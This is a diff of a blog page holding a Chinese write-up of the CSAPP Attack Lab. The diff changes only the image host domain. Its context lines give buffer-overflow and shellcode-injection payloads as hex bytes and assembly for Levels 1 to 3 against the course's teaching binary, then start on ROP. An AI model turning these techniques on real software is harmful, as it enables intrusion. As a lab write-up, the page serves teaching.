@@ -29,17 +29,17 @@
 <meta property="og:site_name" content="Garen Wang&#39;s Blog">
 <meta property="og:description" content="今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。 使用方法最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来 hex2raw读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。 直接运行ctarget或rtarget会没办法运行，报了个Running on an illegal host">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
-<meta property="og:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
-<meta property="og:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
-<meta property="og:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
-<meta property="og:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
+<meta property="og:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
+<meta property="og:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
+<meta property="og:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
+<meta property="og:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
+<meta property="og:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
 <meta property="article:published_time" content="2021-01-17T03:45:32.000Z">
 <meta property="article:modified_time" content="2021-03-18T13:26:59.899Z">
 <meta property="article:author" content="Garen Wang">
 <meta property="article:tag" content="CSAPP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
+<meta name="twitter:image" content="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
 
 <link rel="canonical" href="http://garen-wang.cn/2021/01/17/CSAPP-Attack-Lab-Writeup/">
 
@@ -270,7 +270,7 @@
 <p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
 <h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
+<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
 <h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
 <p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
 <p>构造shellcode当然先写汇编，有两种写法：</p>
@@ -281,14 +281,14 @@
 <p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
 <p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
 <p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
+<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
-<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
+<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
 <h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
 <p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
-<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
+<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
 <p>Jan 17 upd：第二种shellcode的汇编也可以这样写：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq 0x006044e4, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
 <p>mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。</p>
@@ -306,7 +306,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
 <p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
 <p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
+<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
 <h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
 <p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
 <p>而我们大可直接用ROPgadget来做。。。</p>
